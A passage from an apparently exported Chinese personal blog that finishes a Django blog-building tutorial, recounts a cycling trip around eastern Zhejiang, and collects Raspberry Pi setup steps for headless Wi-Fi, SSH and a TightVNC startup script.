<pre><code>python manage.py createsuperuser  #创建账户
Username (leave blank to use &#39;fnngj&#39;):  admin  #管理员帐号
Email address:  894519210@qq.com  #email
Password:  ********  # 密码
Password (again):  ********  #重复密码
Superuser created successfully.  #创建成功</code></pre><p>接下来我们将创建好的<code>Article</code>数据表绑定到后台管理程序。</p>
<p>打开<code>index</code>下的<code>admin.py</code>文件，写入如下内容：</p>
<pre><code>from django.contrib import admin
from index.models import Article

class ArticleAdmin(admin.ModelAdmin):
    list_display = [&#39;title&#39;, &#39;content&#39;, &#39;post_time&#39;, &#39;views&#39;]

admin.site.register(Article, ArticleAdmin)</code></pre><p>然后在<code>blog</code>下输入以下指令，启动Django：</p>
<pre><code>python manage.py runserver</code></pre><p>在浏览器中输入<code>127.0.0.1:8000/admin</code>，输入用户名密码，进入后台管理页面。</p>
<p>在这里，我们可以撰写文章了，当务之急，肯定是先写个“Hello, World!”嘛。</p>
<p><img  src="https://pic.izhaoo.com/20180827131159.jpg"  ><span class="image-caption">hello,world</span></p>
<p>可以看到，Django默认配置的后台管理程序还是很方便的，虽说有点小丑，但功能还是很齐全的。没关系，我们后面会开发自己的后台管理页面。</p>
<h1 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h1><p>数据库已经有文章内容了，这时候我们需要完成我们的前台页面。</p>
<p>首先在<code>index</code>目录下创建一个<code>templates</code>文件夹，这个文件夹是用来存放我们的<code>.html</code>文件的。在<code>templates</code>目录下将我们<code>前端文件</code>中的<code>.html</code>文件全拷进去。</p>
<p>打开<code>veiws.py</code>文件，输入：</p>
<pre><code>from django.shortcuts import render
from index.models import Article  #引入Article类，即数据库

def index(request):
    articleList = Article.objects.order_by(&quot;-post_time&quot;).all()  #从数据库中读出所有文章列表
    return render(request, &#39;index.html&#39;, &#123;&#39;articleList&#39;: articleList&#125;)  #将文章列表渲染到index.html

def article(request, id):
    article = Article.objects.get(pk=id)
    return render(request, &#39;article.html&#39;, &#123;&#39;article&#39;: article&#125;)</code></pre><p>打开<code>index.html</code>，将其中输出文章列表的<code>div</code>内容改成如下（多余的div块删了吧，只留一个就行）</p>
<pre><code>&lt;div class=&quot;container list wrap&quot;&gt;
    &amp;#123;% for article in articleList %&amp;#125;
        &lt;div class=&quot;content&quot;&gt;
            &lt;h3&gt;
                &lt;a href=&quot;\&amp;#123;% url &#39;index:article&#39; article.id %\&#125;&quot;&gt;&#123;&#123; article.title &#125;&#125;&lt;/a&gt;
            &lt;/h3&gt;
            &lt;div class=&quot;info&quot;&gt;
                &lt;span&gt;
                    &lt;i class=&quot;fa fa-clock-o&quot;&gt;&lt;/i&gt;发布时间: &#123;&#123; article.post_time &#125;&#125;&lt;/span&gt;
                &lt;span&gt;
                    &lt;i class=&quot;fa fa-eye&quot;&gt;&lt;/i&gt;阅读量: &#123;&#123; article.views &#125;&#125;&lt;/span&gt;
            &lt;/div&gt;
            &#123;&#123; article.content &#125;&#125;
        &lt;/div&gt;
    &amp;#123;% endfor %&amp;#125;
&lt;/div&gt;</code></pre><p>稍微解释一下，这个<code>views.py</code>就是负责将数据从数据库调出，业务逻辑处理后，渲染到前端模板（<code>index.html</code>）。我们对应着这两个文件看：</p>
<p><img  src="https://pic.izhaoo.com/20180827135408.jpg"  ><span class="image-caption">视图层解释</span></p>
<p><code>views.py</code>读取了<code>Article</code>数据库中的数据，存放到<code>articleList</code>这个变量中，然后渲染到<code>index.html</code>文件。</p>
<p><code>&amp;#123;% for article in articleList %&amp;#125;</code> 表示进行循环，文章有就循环几次。<code>&#123;&#123; article.title &#125;&#125;</code>双括号中的数据会替换成数据库中读出的每条记录，这里就是对应文章的标题。</p>
<p><code>\&amp;#123;% url &#39;index:article&#39; article.id %\&#125;</code>会渲染成一条链接，链接到<code>index</code>应用中的<code>article</code>类并传入<code>article</code>的<code>ID</code>，即<code>/article/id/</code>。</p>
<p>同样的，我们将<code>article.html</code>也套入渲染标签，具体的可以参照项目文件。</p>
<h1 id="路由绑定"><a href="#路由绑定" class="headerlink" title="路由绑定"></a>路由绑定</h1><p>写完模板文件后网页还不能直接访问，因为我们还没有建立对应的路由。</p>
<p>在<code>blog</code>目录下的<code>urls.py</code>写入内容：</p>
<pre><code>from django.contrib import admin
from django.urls import path, include

urlpatterns = [
    path(&#39;admin/&#39;, admin.site.urls),  #后台的URL
    path(&#39;&#39;, include(&#39;index.urls&#39;)),  #index应用的URL
]</code></pre><p>然后在<code>index</code>目录新建一个<code>urls.py</code>，写入：</p>
<pre><code>from django.urls import path
from . import views  #引入视图类

app_name = &#39;index&#39;  #定义命名空间
urlpatterns = [
    path(&#39;&#39;, views.index, name=&#39;index&#39;),  #绑定index，即首页
    path(&#39;article/&lt;int:id&gt;/&#39;, views.article, name=&#39;article&#39;),  #绑定artile，即文章页
]</code></pre><p>这里我们用到了俩个<code>urls.py</code>，这样做有个好处，系统先解析到项目目录下的<code>urls</code>，再分发到各个应用下的<code>urls</code>，当应用多时，不容易发生冲突。一图以蔽之：</p>
<p><img  src="https://pic.izhaoo.com/20180827141153.jpg"  ><span class="image-caption">url分发</span></p>
<p>解释一下<code>path</code>，<code>path(&#39;article/&lt;int:id&gt;/&#39;, views.article, name=&#39;article&#39;)</code>中： 第一部分为匹配URL（匹配“article/id”），<code>&lt;int:id&gt;</code>说明传入一个int类型的id参数；第二部分将匹配到的链接解析到<code>views.py</code>视图文件中的<code>article</code>类；第三部分<code>name=&#39;article&#39;</code>定义的是一个别名，前面<code>\&amp;#123;% url &#39;index:article&#39; article.id %\&#125;</code>中的<code>index:article</code>就是这个别名。</p>
<p>现在运行<code>python manmage.py runserver</code>，就可以看到页面了。</p>
<p><img  src="https://pic.izhaoo.com/20180827141930.jpg"  ><span class="image-caption">无样式首页</span></p>
<p>很丑对不对，因为我们没有引入<code>css</code>样式，下面介绍怎么引入静态资源。</p>
<h1 id="静态资源引入"><a href="#静态资源引入" class="headerlink" title="静态资源引入"></a>静态资源引入</h1><p>页面中的<code>css、js、images、fonts</code>都是静态资源，我们需要将它存放到公共目录，然后在<code>html</code>中动态引入。</p>
<pre><code>为什么要动态引入？
一： 动态引入后，我们如需变动静态资源的位置，只需在`setting.py`中重新设置下静态资源的路径即可，不必到各个`html`中改，省事儿。二： 项目在生产环境中运行时，一般只把静态资源暴露给用户，这样有利于网站安全。</code></pre><p>在<code>index</code>目录中新建一个<code>static</code>文件夹，将前端文件中的静态资源（css、js、images、ico、fonts)全都丢进去。</p>
<p>由于Django默认就已经设置好了静态资源的路径，即当前应用下的<code>static</code>文件夹，所以我们无需另外设置。</p>
<p>在<code>index.html</code>中最前面写上<code>\&amp;#123;% load static %\&#125;</code>，说明我们引入了静态资源。将标签中的静态资源都改成以下格式<code>\&amp;#123;% static &#39;css/index.css&#39; %\&#125;</code>。贴张图很明白：</p>
<p><img  src="https://pic.izhaoo.com/20180827143126.jpg"  ><span class="image-caption">静态资源</span></p>
<p>ps: js也要改，如果有图片也得改。</p>
<p>再次运行服务器，刷新下页面，是不是样式回来啦~</p>
<p><img  src="https://pic.izhaoo.com/20180827143250.jpg"  ><span class="image-caption">有样式首页</span></p>
<h1 id="模板分离"><a href="#模板分离" class="headerlink" title="模板分离"></a>模板分离</h1><p>不知道你有没有发现，我们这个项目中<code>index.html</code>和<code>article.html</code>俩个文件的头部和尾部（也就是引入的静态资源部分）是一样的，不同的只是中间内容部分。我们可以建立一个公共模板页面，然后其他页面都套用这个公共页面，只更改变化的部分即可。</p>
<pre><code>原因很显然，牵一发而动全身。</code></pre><p>在<code>templates</code>目录中新建一个<code>base.html</code>，它就是我们的公共模板，写入：</p>
<pre><code>\&amp;#123;% load static %\&#125;
&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;zh-CN&quot;&gt;

&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot; /&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot; /&gt;
    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;\&amp;#123;% static &#39;css/font-awesome.min.css&#39; %\&#125;&quot;&gt;
    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;\&amp;#123;% static &#39;css/bootstrap.min.css&#39; %\&#125;&quot;&gt;
    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;\&amp;#123;% static &#39;css/index.css&#39; %\&#125;&quot;&gt;
    &lt;link rel=&quot;icon&quot; href=&quot;\&amp;#123;% static &#39;favicon.ico&#39; %\&#125;&quot;&gt;
    &amp;#123;% block header %&amp;#125;&amp;#123;% endblock %&amp;#125;
    &lt;title&gt;zhaoo&lt;/title&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;nav class=&quot;navbar navbar-expand-md bg-dark navbar-dark&quot;&gt;
        &lt;div class=&quot;container&quot;&gt;
            &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;zhaoo&lt;/a&gt;
            &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#collapsibleNavbar&quot;&gt;
                &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
            &lt;/button&gt;
            &lt;!-- &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;collapsibleNavbar&quot;&gt;
                &lt;ul class=&quot;navbar-nav&quot;&gt;
                    &lt;li class=&quot;nav-item&quot;&gt;
                        &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;&lt;i class=&quot;fa fa-home&quot;&gt;&lt;/i&gt;&amp;nbsp;首页&lt;/a&gt;
                    &lt;/li&gt;
                    &lt;li class=&quot;nav-item&quot;&gt;
                        &lt;a class=&quot;nav-link&quot; href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-file-text&quot;&gt;&lt;/i&gt;&amp;nbsp;文章&lt;/a&gt;
                    &lt;/li&gt;
                    &lt;li class=&quot;nav-item&quot;&gt;
                        &lt;a class=&quot;nav-link&quot; href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-info-circle&quot;&gt;&lt;/i&gt;&amp;nbsp;关于&lt;/a&gt;
                    &lt;/li&gt;
                &lt;/ul&gt;
            &lt;/div&gt; --&gt;
        &lt;/div&gt;
    &lt;/nav&gt;
    &amp;#123;% block content %&amp;#125;&amp;#123;% endblock %&amp;#125;
    &lt;footer class=&quot;footer&quot;&gt;
        &lt;div class=&quot;container&quot;&gt;
            &lt;ul class=&quot;link&quot;&gt;
                &lt;li&gt;&lt;a href=&quot;#&quot;&gt;友情链接&lt;/a&gt;&lt;/li&gt;
                &lt;li&gt;&lt;a href=&quot;#&quot;&gt;站点地图&lt;/a&gt;&lt;/li&gt;
                &lt;li&gt;&lt;a href=&quot;#&quot;&gt;关于我们&lt;/a&gt;&lt;/li&gt;
                &lt;li&gt;&lt;a href=&quot;#&quot;&gt;管理后台&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
            &lt;p class=&quot;copyright&quot;&gt;Copyright© 2018-2018 | &lt;a href=&quot;#&quot;&gt;zhaoo&lt;/a&gt; .AllRightsReserved&lt;/p&gt;
        &lt;/div&gt;
    &lt;/footer&gt;
    &lt;script src=&quot;\&amp;#123;% static &#39;js/jquery.min.js&#39; %\&#125;&quot;&gt;&lt;/script&gt;
    &lt;script src=&quot;\&amp;#123;% static &#39;js/bootstrap.min.js&#39; %\&#125;&quot;&gt;&lt;/script&gt;
    &lt;script src=&quot;\&amp;#123;% static &#39;js/index.js&#39; %\&#125;&quot;&gt;&lt;/script&gt;
    &lt;script src=&quot;\&amp;#123;% static &#39;/ckeditor/ckeditor/ckeditor.js&#39; %\&#125;&quot;&gt;&lt;/script&gt;
    &lt;script src=&quot;\&amp;#123;% static &#39;/ckeditor/ckeditor-init.js&#39; %\&#125;&quot;&gt;&lt;/script&gt;
    &amp;#123;% block footer %&amp;#125;&amp;#123;% endblock %&amp;#125;
&lt;/body&gt;

&lt;/html&gt;</code></pre><p>然后在<code>index.html</code>中我们就可以这么写了：</p>
<pre><code>&amp;#123;% extends &quot;base.html&quot; %&amp;#125;
&amp;#123;% block content %&amp;#125;
&lt;div class=&quot;container list wrap&quot;&gt;
    &amp;#123;% for article in articleList %&amp;#125;
        &lt;div class=&quot;content&quot;&gt;
            &lt;h3&gt;
                &lt;a href=&quot;\&amp;#123;% url &#39;index:article&#39; article.id %\&#125;&quot;&gt;&#123;&#123; article.title &#125;&#125;&lt;/a&gt;
            &lt;/h3&gt;
            &lt;div class=&quot;info&quot;&gt;
                &lt;span&gt;
                    &lt;i class=&quot;fa fa-clock-o&quot;&gt;&lt;/i&gt;发布时间: &#123;&#123; article.post_time &#125;&#125;&lt;/span&gt;
                &lt;span&gt;
                    &lt;i class=&quot;fa fa-eye&quot;&gt;&lt;/i&gt;阅读量: &#123;&#123; article.views &#125;&#125;&lt;/span&gt;
            &lt;/div&gt;
            &#123;&#123; article.content &#125;&#125;
        &lt;/div&gt;
    &amp;#123;% endfor %&amp;#125;
&lt;/div&gt;
&amp;#123;% endblock %&amp;#125;</code></pre><p>解释：</p>
<pre><code>模板：
&amp;#123;% block content %&amp;#125;
&amp;#123;% endblock %&amp;#125;

子文件：
&amp;#123;% extends &quot;base.html&quot; %&amp;#125;  //引入base.html模板
&amp;#123;% block content %&amp;#125;
    ...code...  #其中变化的部分
&amp;#123;% endblock %&amp;#125;</code></pre><p>子文件中<code>&amp;#123;% block content %&amp;#125;&amp;#123;% endblock %&amp;#125;</code>块包围的内容就是不同的部分，系统解析时会动态插入模板中，最后生成一个个页面。</p>
<p>做到这一步，我们的博客项目就已经基本成型了，前台是我们自己写的，后台是Django自带的。</p>
<h1 id="后台管理页面美化"><a href="#后台管理页面美化" class="headerlink" title="后台管理页面美化"></a>后台管理页面美化</h1><p>这部分开始都是一些无关紧要的优化，做不做随意。</p>
<h1 id="安装Mdeditor富文本编辑器"><a href="#安装Mdeditor富文本编辑器" class="headerlink" title="安装Mdeditor富文本编辑器"></a>安装Mdeditor富文本编辑器</h1>]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>框架</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>浙东骑行</title>
    <url>/2018/08/19/cycling-east-zhejiang/</url>
    <content><![CDATA[<p>一场说走就走的旅行。</p>
<span id="more"></span>

<p>4 days, 2 persons, 350km, 浙东小环线。</p>
<p>新昌 → 天台 → 临海 → 仙居 → 磐安 → 东阳 → 嵊州 → 新昌</p>
<p>浙D → 浙J → 浙G → 浙D</p>
<p>这个暑假貌似很浪啊，跑来跑去玩儿。毕竟,也没几个暑假可以浪了，也正好项目苟完了，那就来个说走就走的旅行吧。之前就一直计划来个骑行，浙北啊，舟山啊，金华啊.最后还是选择在家门口绕一圈，第一次嘛，没经历过，太远怕回不来。</p>
<p>大致看了圈地图，计划是一天一座城，每天骑个50km左右，绕个一星期左右回家。实践起来却发现，骑车真不累，一天50km太low了。最后就是一天一个市，浙D-浙J-浙G-浙D，上午50km保底，下午随便散散。天气嘛，看了看可能有只小台风捣乱，阴雨天为主，很棒棒。</p>
<h3 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h3><p>新昌→天台, 雨, 70km, 300m爬坡</p>
<p>天台嘛，半个月前刚去玩过，所以路还是比较熟的。一大早就出发了，天气棒棒，阴。斑竹→儒岙这段爬坡是真的蛋疼，走了好久。中午到了关岭，下雨，手机摔了，磕了几道痕，心疼。Then，“白鹤镇”，到了半个月前去过的小饭店吃午饭，饭菜棒棒，yo，不吃饭，只吃菜。</p>
<p><img  src="https://pic.izhaoo.com/20180821113545.jpg"  ><span class="image-caption">关岭隧道</span></p>
<p>天台是真的良心，景区基本上不要钱。</p>
<p><img  src="https://pic.izhaoo.com/20180821124012.jpg"  ><span class="image-caption">始丰湖</span></p>
<h3 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h3><p>天台→临海→仙居, 多云, 90km</p>
<p>第二天全程都是平路，轻轻松松。But，酒店早饭没吃饱哈，骑了个把钟头就饿死了，正好过了临海境，前不着村后不着店的，没地儿补充能量。饿的肚子都疼了……骑了好久终于找到个小村子，“沿岸村”是吧，总算有家卫星小店（地图还能搜到），小店还没肉肉卖，只能买包“瑞士卷”填填，发誓这是我这几天吃过最好吃的东西了，太好吃了^_^。</p>
<p><img  src="https://pic.izhaoo.com/20180820153212.jpg"  ><span class="image-caption">宾馆早饭</span></p>
<p><img  src="https://pic.izhaoo.com/20180820153226.jpg"  ><span class="image-caption">瑞士卷</span></p>
<p>吃完继续走，目的地是“括苍镇”，途经“董岸村”。我曾经，跨过山和大海，也穿过人山人海；我曾经，被小溪挡住了去路。不得不吐槽百度地图真的坑爹，哪里不通指哪里，哪里偏僻导哪里，哪里走过绕哪里。</p>
<p><img  src="https://pic.izhaoo.com/20180820153841.jpg"  ><span class="image-caption">此路不通</span></p>
<p>绕了十公里继续走，终于到了“括苍镇”，吃个午饭补补。结果一打听，“括苍山”在修路，上不去了。妈耶，就是为了“括苍山”露营来的，现在告诉计划我泡汤了？？？难受……吃完饭继续走，一分钟都不想留，目的地“仙居”。</p>
<p><img  src="https://pic.izhaoo.com/20180820154631.jpg"  ><span class="image-caption">括苍镇</span></p>
<h3 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h3><p>仙居→磐安→东阳, 雨, 80km, 500m大爬坡</p>
<p>魔鬼式，地狱式，50KM，500m，大爬坡，全程没有一段下坡。磐安啊磐安，没事把城建的那么高作甚，会出人命的。</p>
<p><img  src="https://pic.izhaoo.com/20180821125041.jpg"  ><span class="image-caption">横山岭隧道</span></p>
<h3 id="第四天"><a href="#第四天" class="headerlink" title="第四天"></a>第四天</h3><p>横店·清明上河图半日游, 多云</p>
<p>没什么好玩的，门票还那么贵，走了一上午腿酸的不行，比骑车还累，回家回家……</p>
<p><img  src="https://pic.izhaoo.com/20180821124345.jpg"  ><span class="image-caption">清明上河图</span></p>
<p>不得不说，老长沙臭豆腐是真的好吃，可以和绍兴臭豆腐齐名了。也不知道上次在湖州吃的是什么鬼玩意，煮的假长沙臭豆腐，难吃的一批。yo，这里的泰茶也不错。</p>
<p><img  src="https://pic.izhaoo.com/20180821124649.jpg"  ><span class="image-caption">老长沙臭豆腐</span></p>
<p><img  src="https://pic.izhaoo.com/20180821124743.jpg"  ><span class="image-caption">泰茶</span></p>
<h3 id="第五天"><a href="#第五天" class="headerlink" title="第五天"></a>第五天</h3><p>东阳→嵊州→新昌, 阴, 90km</p>
<p>该回家啦，这段路也是很轻松的，全平路。这条路小时候跟着老爸不知道来过多少次了，N年后还是这个样子，无非是水泥变柏油了。途径“浙西饭店”，一家有记忆的饭店。小时候跟着老爸出差，肯定是来这家店吃午饭的。那时候，门口车停地满满的，饭店坐的满满的；炸溪鱼，吃完还得再点一份带走路上吃……时过境迁……</p>
<p><img  src="https://pic.izhaoo.com/20180821125717.jpg"  ><span class="image-caption">浙西饭店</span></p>
<h3 id="关于装备"><a href="#关于装备" class="headerlink" title="关于装备"></a>关于装备</h3><ul>
<li><p>不带会死系列：货架、驼包、车前包、骑行服（骑行内内）、防晒、头盔、捆扎绳、充电宝、身份证、学生证、塑料袋若干、水壶</p>
</li>
<li><p>可有可无系列：单反、手机支架、强光手电、压缩饼干、冰袖、耳机、骑行手套、应急药品、白油</p>
</li>
<li><p>并没卵用系列：泡腾片、盐、骑行面罩、压缩毛巾、爽身粉（迷）</p>
</li>
<li><p>没带懊悔系列：蓝牙小钢炮</p>
</li>
</ul>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>旅行</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派 - 安装配置汇总</title>
    <url>/2018/05/28/raspberrypi-config-collect/</url>
    <content><![CDATA[<p>树莓派3安装和配置汇总。之前零零散散写过好多篇关于树莓派的博文，这里整合一下。</p>
<span id="more"></span>

<h1 id="无屏幕安装系统"><a href="#无屏幕安装系统" class="headerlink" title="无屏幕安装系统"></a>无屏幕安装系统</h1><h2 id="问题说明"><a href="#问题说明" class="headerlink" title="问题说明"></a>问题说明</h2><p>刚军训完的大学狗还没开始上课，比较闲，正巧从家里带了树莓派（我这个人呐，上大学都不忘带上些家伙），开始折腾咯。寝室没路由器，先折腾个路由器玩玩。燃鹅却遇到了麻烦。</p>
<p>寝室没有显示器，该怎么安装系统呢，理所当然的想到先ssh连接，装个vnc远程桌面即可。燃鹅，我还是太天真了。好久没玩树莓派，最新的固件默认取消了ssh连接，说是为了安全性，唉。另外寝室还没路由器，我拿网线接电脑试了下，一直没成功，无奈之下怒买小米路由器3，总算解决了连接问题。（好像有些不对劲，我不是想折腾一个路由器来着）</p>
<h2 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h2><h3 id="1-下载以下工具"><a href="#1-下载以下工具" class="headerlink" title="1.下载以下工具"></a>1.下载以下工具</h3><p><a href="https://sourceforge.net/projects/win32diskimager/files/Archive/win32diskimager-v0.9-binary.zip/download">镜像烧录工具 - Win32DiskImager</a></p>
<p><a href="http://downloads.raspberrypi.org/raspbian_latest">镜像 - RaspbainJessie</a></p>
<p>ps. 这里我们以“Jessie”系统为例，我觉得这是合新手入坑的最好选择。其实树莓派支持好多种系统（Linux、Android、win），我们也可以去<a href="https://www.raspberrypi.org/downloads/">官方网站</a>下载或找民间包，这里不赘述。</p>
<h3 id="2-烧录镜像"><a href="#2-烧录镜像" class="headerlink" title="2.烧录镜像"></a>2.烧录镜像</h3><p>将sd卡用读卡器连接电脑。解压上面下载的俩个文件，打开“Win32DiskImager”，选择“之前下载的镜像文件.img”和“目标磁盘”。（别选错了，会执行格式化）然后点击“write”写入即可，等几分钟镜像就写到sd卡上了。</p>
<p><img  src="https://pic.izhaoo.com/20170920084254.jpg"  ><span class="image-caption">烧录镜像</span></p>
<p>这时候将sd卡插回树莓派就可以开机了，但是，等等，我们没有显示器，所以还要做些工作。</p>
<h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><h3 id="1-配置wifi"><a href="#1-配置wifi" class="headerlink" title="1.配置wifi"></a>1.配置wifi</h3><p>我们可以在未开机的情况下修改“/boot/wpa_supplicant.conf”来配置wifi。</p>
<p>打开“/boot/”目录。新建一个“wpa_supplicant.conf”文件，注意后缀哦，记事本打开。</p>
<p><img  src="https://pic.izhaoo.com/20170920095142.jpg"  ><span class="image-caption">boot目录</span></p>
<p>写入以下代码：</p>
<pre><code>country=CN
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1

network=&#123;
ssid=&quot;zhaoo&quot;        #ssid（wifi用户名）
psk=&quot;12345678&quot;      #password（wifi密码）
key_mgmt=WPA-PSK    #wifi加密方式
priority=1          #优先级
&#125;</code></pre><blockquote>
<p>摘自：<a href="http://shumeipai.nxez.com/2017/09/13/raspberry-pi-network-configuration-before-boot.html">树莓派实验室</a></p>
</blockquote>
<p>说明以及不同安全性的 WiFi 配置示例：</p>
<pre><code>#ssid:网络的ssid
#psk:密码
#priority:连接优先级，数字越大优先级越高（不可以是负数）
#scan_ssid:连接隐藏WiFi时需要指定该值为1

如果你的 WiFi 没有密码

network=&#123;
ssid=&quot;你的无线网络名称（ssid）&quot;
key_mgmt=NONE
&#125;

如果你的 WiFi 使用WEP加密

network=&#123;
ssid=&quot;你的无线网络名称（ssid）&quot;
key_mgmt=NONE
wep_key0=&quot;你的wifi密码&quot;
&#125;

如果你的 WiFi 使用WPA/WPA2加密

network=&#123;
ssid=&quot;你的无线网络名称（ssid）&quot;
key_mgmt=WPA-PSK
psk=&quot;你的wifi密码&quot;
&#125;

如果你不清楚 WiFi 的加密模式，可以在安卓手机上用 root explorer 打开 /data/misc/wifi/wpa/wpa_supplicant.conf，查看 WiFi 的信息。</code></pre><h3 id="2-配置ssh"><a href="#2-配置ssh" class="headerlink" title="2.配置ssh"></a>2.配置ssh</h3><p>新版“Jessie”系统默认是关闭ssh的，说是为了安全，麻烦的一批。</p>
<p>在“/boot/”目录下新建“ssh”文件。（注意是小写且没有后缀的空文件）然后树莓派开机的时候检测到了这个文件就会开启ssh，还是没那么麻烦的。</p>
<h3 id="3-电脑安装ssh连接软件"><a href="#3-电脑安装ssh连接软件" class="headerlink" title="3.电脑安装ssh连接软件"></a>3.电脑安装ssh连接软件</h3><p>安利俩个工具吧，自行下载。</p>
<p><a href="http://www.putty.org/">putty</a></p>
<p><a href="http://www.netsarang.com/products/xsh_overview.html">xshell</a></p>
<h3 id="4-开机"><a href="#4-开机" class="headerlink" title="4.开机"></a>4.开机</h3><p>将sd卡插回树莓派，通电开机。然后打开路由器后台，可以看到多了一台名为“raspberrypi”的设备，查看一下ip地址。</p>
<p><img  src="https://pic.izhaoo.com/20170920100757.jpg"  ><span class="image-caption">查看ip</span></p>
<p>然后ssh软件设置一下ip地址就可以连上树莓派了。</p>
<p><img  src="https://pic.izhaoo.com/20170920101010.jpg"  ><span class="image-caption">填写ip</span></p>
<p>需要填写树莓派ssh的用户名和密码。默认密码如下：</p>
<pre><code>用户名：pi
密码：raspberry</code></pre><p><img  src="https://pic.izhaoo.com/20170920084453.jpg"  ><span class="image-caption">填写用户名密码</span></p>
<p>连接！看到以下界面就说明ssh连接树莓派成功了。尽情地折腾吧。</p>
<p><img  src="https://pic.izhaoo.com/20170920084314.jpg"  ><span class="image-caption">ssh连接成功</span></p>
<h1 id="IMG镜像解压"><a href="#IMG镜像解压" class="headerlink" title="IMG镜像解压"></a>IMG镜像解压</h1><p>今天折腾树莓派的更新源，手贱把原来的官方源删除了。网上教程都说加注释。别删！别删！别删！然后我不听，然后我就呵呵了。国内的源是残缺的，某些软件下载不了。</p>
<p>痛定思痛，问题总归是要解决的。</p>
<ul>
<li><p>官方源我可记不住，网上也找不到。</p>
</li>
<li><p>重做系统？别了别了！我选择去死。</p>
</li>
</ul>
<p>那么只能去官方下一个img镜像把里面的“sources.list”提取出来替换了。于是遇到了麻烦，img根本解压不了。简单的谷歌一下，get到了一款软件“LinuxRecovery”，可以用来解压img。</p>
<p><a href="https://pan.baidu.com/s/1hsyA3Ow">LinuxRecovery</a></p>
<p>教程我就不打字了，一早上写了太多了，放几张图片吧。相信机智你一定能解决的。 &gt;&gt;&gt;跑…</p>
<p><img  src="https://pic.izhaoo.com/20170921095444.jpg"  ><span class="image-caption">IMG镜像解压-1</span></p>
<p><img  src="https://pic.izhaoo.com/20170921095501.jpg"  ><span class="image-caption">IMG镜像解压-2</span></p>
<p><img  src="https://pic.izhaoo.com/20170921095537.jpg"  ><span class="image-caption">IMG镜像解压-3</span></p>
<p><img  src="https://pic.izhaoo.com/20170921095600.jpg"  ><span class="image-caption">IMG镜像解压-4</span></p>
<p><img  src="https://pic.izhaoo.com/20170921095623.jpg"  ><span class="image-caption">IMG镜像解压-5</span></p>
<p><img  src="https://pic.izhaoo.com/20170921095708.jpg"  ><span class="image-caption">IMG镜像解压-6</span></p>
<h1 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h1><p>折腾树莓派嘛，当然少不了GUI图形界面，除非你是大佬，TUI文本界面敲代码，膜拜膜拜。说正经的，本文我们将安装个vnc远程连接树莓派。</p>
<h2 id="树莓派端安装vnc服务端"><a href="#树莓派端安装vnc服务端" class="headerlink" title="树莓派端安装vnc服务端"></a>树莓派端安装vnc服务端</h2><p>首先我们ssh连接树莓派，还没连接过ssh的可以看我之前文章。<a href="http://note.izhaoo.com/raspberrypi-install-system-without-display/">树莓派 – 无屏幕安装系统</a></p>
<p>敲入以下代码：</p>
<pre><code>sudo apt-get install tightvncserver    #安装vnc服务端</code></pre><pre><code>vncpasswd    #设置vnc连接密码</code></pre><p>两次输入密码，回车，注意密码是不会显示的。然后提示你是否设置查看(view-only)密码，没必要，按“n”。</p>
<pre><code>sudo nano /etc/init.d/tightvncserver    #新建“tightvncserver”文件，设置开机启动</code></pre><p>在nano编辑器内粘贴以下代码。然后按“ctrl+x”，再按“y”保存，回车确认。</p>
<pre><code>#!/bin/sh
### BEGIN INIT INFO
# Provides:          tightvncserver
# Required-Start:    $local_fs
# Required-Stop:     $local_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Start/stop tightvncserver
### END INIT INFO
# More details see:
# http://www.penguintutor.com/linux/tightvnc
### Customize this entry
# Set the USER variable to the name of the user to start tightvncserver under
export USER=&#39;pi&#39;
### End customization required
eval cd ~$USER
case &quot;$1&quot; in
  start)
    # 启动命令行。此处自定义分辨率（和你电脑分辨率设置一样吧）、控制台号码或其它参数。控制台号码设置为“0”的话之后可以不写。
    su $USER -c &#39;/usr/bin/tightvncserver -depth 16 -geometry 1366x768 :1&#39;
    echo &quot;Starting TightVNC server for $USER &quot;
    ;;
  stop)
    # 终止命令行。此处控制台号码与启动一致。
    su $USER -c &#39;/usr/bin/tightvncserver -kill :1&#39;
    echo &quot;Tightvncserver stopped&quot;
    ;;
  *)
    echo &quot;Usage: /etc/init.d/tightvncserver &#123;start|stop&#125;&quot;
    exit 1
    ;;
esac
exit 0</code></pre><p>再给tightvncserver文件加执行权限，并更新开机启动列表。</p>
<pre><code>sudo chmod 755 /etc/init.d/tightvncserver
sudo update-rc.d tightvncserver defaults</code></pre><p>OK！树莓派端折腾完毕。</p>
<h2 id="PC端安装VNC客户端"><a href="#PC端安装VNC客户端" class="headerlink" title="PC端安装VNC客户端"></a>PC端安装VNC客户端</h2><p>安利一个vnc客户端（同时它也有服务端）</p>
<p><a href="https://www.realvnc.com/en/connect/download/vnc/">RealVnc</a></p>
